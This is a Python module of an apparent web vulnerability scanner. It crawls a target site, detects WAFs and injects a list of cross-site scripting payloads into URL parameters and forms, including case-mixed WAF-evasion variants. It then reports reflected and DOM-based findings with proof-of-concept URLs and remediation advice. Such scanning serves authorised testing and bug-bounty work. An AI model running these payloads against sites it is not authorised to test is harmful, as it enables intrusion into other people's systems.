"""
RAPTOR XSS Testing Module v3.1
================================
Key improvements over v3.0:
- Crawls the target first to find REAL pages with forms/params
- Tests every discovered form (POST and GET)
- Uses canary-based reflection for zero false positives
- Handles bWAPP and similar deliberately vulnerable apps correctly
"""

import re
import asyncio
import hashlib
import html as _html_module
import random
import copy
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote, urlencode

from core.base_module import BaseModule, Finding


# ── Payload dataclass ─────────────────────────────────────────────────────────

@dataclass
class XSSPayload:
    raw:         str
    context:     str
    severity:    str = 'High'
    waf_bypass:  List[str] = field(default_factory=list)
    interaction: bool = False
    confidence:  int  = 10
    canary:      str  = ''

    def with_canary(self, canary: str) -> 'XSSPayload':
        marked = self.raw.replace('RPTR', canary)
        p = XSSPayload(marked, self.context, self.severity,
                       list(self.waf_bypass), self.interaction, self.confidence)
        p.canary = canary
        return p


# ── Payload library ───────────────────────────────────────────────────────────

_PAYLOADS_HTML = [
    XSSPayload('<script>alert("RPTR")</script>',                    'html', 'High',  confidence=11),
    XSSPayload('<img src=x onerror=alert("RPTR")>',                 'html', 'High',  confidence=11),
    XSSPayload('<svg onload=alert("RPTR")>',                        'html', 'High',  confidence=11),
    XSSPayload('<body onload=alert("RPTR")>',                       'html', 'High',  confidence=10),
    XSSPayload('<video><source onerror=alert("RPTR")>',             'html', 'High',  confidence=10),
    XSSPayload('<details open ontoggle=alert("RPTR")>',             'html', 'Medium',interaction=True, confidence=8),
    XSSPayload('<ScRiPt>alert("RPTR")</sCrIpT>',                   'html', 'High',
               waf_bypass=['case_mix'], confidence=8),
    XSSPayload('<SVG/ONload=alert("RPTR")>',                       'html', 'High',
               waf_bypass=['case_mix'], confidence=8),
]

_PAYLOADS_ATTRIBUTE = [
    XSSPayload('" onmouseover="alert(\'RPTR\')"',            'attribute', 'High',  confidence=11),
    XSSPayload("' onmouseover='alert(\"RPTR\")'",            'attribute', 'High',  confidence=11),
    XSSPayload('" onfocus="alert(\'RPTR\')" autofocus="',    'attribute', 'High',  confidence=10),
    XSSPayload('" onerror="alert(\'RPTR\')"',                'attribute', 'High',  confidence=10),
]

_PAYLOADS_SCRIPT = [
    XSSPayload('";alert("RPTR");//',                          'script', 'Critical', confidence=11),
    XSSPayload("';alert('RPTR');//",                          'script', 'Critical', confidence=11),
    XSSPayload('</script><script>alert("RPTR")</script>',     'script', 'Critical', confidence=11),
]

_ALL_PAYLOADS: Dict[str, List[XSSPayload]] = {
    'html':      _PAYLOADS_HTML,
    'attribute': _PAYLOADS_ATTRIBUTE,
    'script':    _PAYLOADS_SCRIPT,
}

_WAF_SIGNATURES = {
    'Cloudflare':  ['cloudflare', 'cf-ray'],
    'ModSecurity': ['mod_security', 'modsecurity'],
    'AWS WAF':     ['aws', 'awselb'],
    'Generic':     ['blocked', 'waf', 'firewall', 'security violation'],
}

_DOM_SINKS = [
    (r'innerHTML\s*=',           'innerHTML'),
    (r'outerHTML\s*=',           'outerHTML'),
    (r'document\.write\s*\(',    'document.write'),
    (r'eval\s*\(',               'eval'),
    (r'location\.href\s*=',      'location.href'),
    (r'insertAdjacentHTML\s*\(', 'insertAdjacentHTML'),
]

_DOM_SOURCES = [
    r'location\.(?:search|hash|href)',
    r'document\.(?:URL|referrer)',
    r'window\.name',
]


def _make_canary() -> str:
    return hashlib.md5(str(random.random()).encode()).hexdigest()[:8]


def _is_reflected_unescaped(canary: str, body: str) -> bool:
    if canary not in body:
        return False
    escaped   = _html_module.escape(canary)
    raw_count = body.count(canary)
    esc_count = body.count(escaped) if escaped != canary else 0
    return raw_count > esc_count


def _detect_context(before: str, after: str) -> str:
    b = before.lower()
    if re.search(r'<script[^>]*>', b, re.DOTALL):
        return 'script'
    if re.search(r'<[^>]+\s\w[\w-]*=["\'][^"\']*$', before, re.I):
        return 'attribute'
    return 'html'


class XSSTester(BaseModule):

    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config,
                         stealth_manager=stealth,
                         db_manager=db,
                         graph_manager=graph_manager)
        self.findings:      List[Finding] = []
        self.tested_combos: Set[str]      = set()
        self.waf_name:      Optional[str] = None
        self._cookie        = ''
        self._auth_header   = ''

    async def __aenter__(self):
        return self

    async def __aexit__(self, *_):
        return False

    # ── Entry point ───────────────────────────────────────────────────────────

    async def run(self, target: str, **kwargs) -> List[Finding]:
        self._cookie      = kwargs.get('cookie', '') or ''
        self._auth_header = kwargs.get('auth_header', '') or ''

        self.logger.info(f'XSS scan → {target}')

        # Phase 1: WAF detection
        await self._detect_waf(target)

        # Phase 2: Crawl to find real pages
        self.logger.info('Crawling target for pages with forms/params...')
        pages = await self.crawl_pages(target, max_pages=60)
        self.logger.info(f'Found {len(pages)} pages to test')

        # Phase 3: Test each page
        sem = asyncio.Semaphore(4)

        async def test_page(page_url: str):
            async with sem:
                # Test URL params
                parsed = urlparse(page_url)
                url_params = list(parse_qs(parsed.query).keys())
                if url_params:
                    await self._phase_reflected(page_url, url_params)

                # Test forms on this page
                forms = await self.get_forms(page_url)
                if forms:
                    await self._phase_forms(forms, page_url)

                # DOM analysis
                await self._phase_dom(page_url)

        await asyncio.gather(*[test_page(p) for p in pages], return_exceptions=True)

        self.logger.info(f'XSS complete — {len(self.findings)} finding(s)')
        return self.findings

    # ── WAF ───────────────────────────────────────────────────────────────────

    async def _detect_waf(self, target: str):
        probe = f'{target}?waf_test={quote("<script>alert(1)</script>")}'
        resp  = await self._make_request(probe, headers=self._h())
        if not resp:
            return
        combined = (await resp.text()).lower() + str(resp.headers).lower()
        for name, sigs in _WAF_SIGNATURES.items():
            if any(s in combined for s in sigs) or resp.status in (403, 406, 501):
                self.waf_name = name
                self.logger.warning(f'WAF detected: {name}')
                return

    # ── Reflected XSS (URL params) ────────────────────────────────────────────

    async def _phase_reflected(self, target: str, params: List[str]):
        sem = asyncio.Semaphore(4)

        async def test_param(param: str):
            async with sem:
                # Quick reflection probe
                canary    = _make_canary()
                probe_url = f'{target}?{param}={canary}' if '?' not in target else f'{target}&{param}={canary}'
                resp      = await self._make_request(probe_url, headers=self._h())
                if not resp:
                    return
                body = await resp.text()
                if canary not in body:
                    return

                # Detect context
                pos    = body.find(canary)
                before = body[max(0, pos-120): pos]
                after  = body[pos+len(canary): pos+len(canary)+120]
                ctx    = _detect_context(before, after)

                # Test payloads
                for base_p in _ALL_PAYLOADS.get(ctx, _PAYLOADS_HTML):
                    p_canary = _make_canary()
                    p        = base_p.with_canary(p_canary)
                    combo    = f'{param}:{p_canary}'
                    if combo in self.tested_combos:
                        continue
                    self.tested_combos.add(combo)

                    sep      = '&' if '?' in target else '?'
                    test_url = f'{target}{sep}{param}={quote(p.raw)}'
                    test_resp = await self._make_request(test_url, headers=self._h())
                    if not test_resp:
                        continue
                    test_body = await test_resp.text()

                    if _is_reflected_unescaped(p_canary, test_body):
                        self._emit(target, param, p, ctx, 'Reflected', test_url)
                        return

        await asyncio.gather(*[test_param(p) for p in params], return_exceptions=True)

    # ── Reflected XSS (Forms) ─────────────────────────────────────────────────

    async def _phase_forms(self, forms: List[Dict], base_target: str):
        sem = asyncio.Semaphore(3)

        async def test_form(form: Dict):
            async with sem:
                for param in list(form['inputs'].keys()):
                    canary       = _make_canary()
                    probe_inputs = copy.deepcopy(form['inputs'])
                    probe_inputs[param] = canary

                    if form['method'] == 'POST':
                        resp = await self._make_request(
                            form['action'], method='POST',
                            data=probe_inputs, headers=self._h()
                        )
                    else:
                        url  = form['action'] + '?' + urlencode(probe_inputs)
                        resp = await self._make_request(url, headers=self._h())

                    if not resp:
                        continue
                    body = await resp.text()
                    if canary not in body:
                        continue

                    pos    = body.find(canary)
                    before = body[max(0, pos-120): pos]
                    after  = body[pos+len(canary): pos+len(canary)+120]
                    ctx    = _detect_context(before, after)

                    for base_p in _ALL_PAYLOADS.get(ctx, _PAYLOADS_HTML)[:8]:
                        p_canary  = _make_canary()
                        p         = base_p.with_canary(p_canary)
                        test_in   = copy.deepcopy(form['inputs'])
                        test_in[param] = p.raw

                        if form['method'] == 'POST':
                            tr = await self._make_request(
                                form['action'], method='POST',
                                data=test_in, headers=self._h()
                            )
                        else:
                            tr = await self._make_request(
                                form['action'] + '?' + urlencode(test_in),
                                headers=self._h()
                            )

                        if not tr:
                            continue
                        tb = await tr.text()
                        if _is_reflected_unescaped(p_canary, tb):
                            self._emit(form['action'], param, p, ctx,
                                       f'Reflected ({form["method"]} Form)',
                                       form['action'])
                            return

        await asyncio.gather(*[test_form(f) for f in forms], return_exceptions=True)

    # ── DOM XSS ───────────────────────────────────────────────────────────────

    async def _phase_dom(self, target: str):
        resp = await self._make_request(target, headers=self._h())
        if not resp:
            return
        body = await resp.text()

        js_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.I)
        all_js    = '\n'.join(js_blocks)
        if not all_js.strip():
            return

        sinks   = [label for pat, label in _DOM_SINKS   if re.search(pat, all_js)]
        sources = [pat   for pat         in _DOM_SOURCES if re.search(pat, all_js)]

        if not (sinks and sources):
            return

        f = Finding(
            module      = 'xss',
            title       = f'[DOM] DOM-based XSS — sinks: {", ".join(sinks[:3])}',
            severity    = 'High',
            description = (
                f'DOM-based XSS potential at {target}\n'
                f'Dangerous sinks: {", ".join(sinks)}\n'
                f'User-controllable sources: {", ".join(sources)}\n\n'
                'Manual verification required. Check DevTools → Sources for '
                'data flow from source to sink.'
            ),
            evidence    = {'sinks': sinks, 'sources': sources, 'url': target},
            poc         = f'Open: {target}#<img src=x onerror=alert(1)>',
            remediation = 'Use textContent not innerHTML; DOMPurify; strict CSP.',
            cvss_score  = 5.4,
            bounty_score= 1000,
            target      = target,
        )
        self.add_finding(f)

    # ── Finding factory ───────────────────────────────────────────────────────

    def _emit(self, target: str, param: str, payload: XSSPayload,
              context: str, xss_type: str, poc_url: str):
        f = Finding(
            module      = 'xss',
            title       = f'XSS in "{param}" ({xss_type}) — {context} context',
            severity    = 'High',
            description = (
                f'## Cross-Site Scripting ({xss_type})\n\n'
                f'**Parameter:** `{param}`\n'
                f'**Context:** `{context}`\n'
                f'**Canary (verified):** `{payload.canary}`\n\n'
                f'### Payload\n```html\n{payload.raw}\n```\n\n'
                f'### PoC URL\n```\n{poc_url}\n```\n\n'
                '### Remediation\n'
                'HTML-encode all reflected output. '
                'Implement Content-Security-Policy. HTTPOnly cookies.'
            ),
            evidence    = {
                'parameter': param, 'payload': payload.raw,
                'context': context, 'xss_type': xss_type,
                'canary': payload.canary, 'waf': self.waf_name,
            },
            poc         = f'Navigate to: {poc_url}',
            remediation = 'HTML-encode reflected output; CSP; HTTPOnly cookies.',
            cvss_score  = 6.1,
            bounty_score= 1500,
            target      = target,
        )
        self.add_finding(f)

    def _h(self, extra: Dict = None) -> Optional[Dict]:
        h = {}
        if self._auth_header and ':' in self._auth_header:
            k, v = self._auth_header.split(':', 1)
            h[k.strip()] = v.strip()
        if self._cookie:
            h['Cookie'] = self._cookie
        if extra:
            h.update(extra)
        return h or None
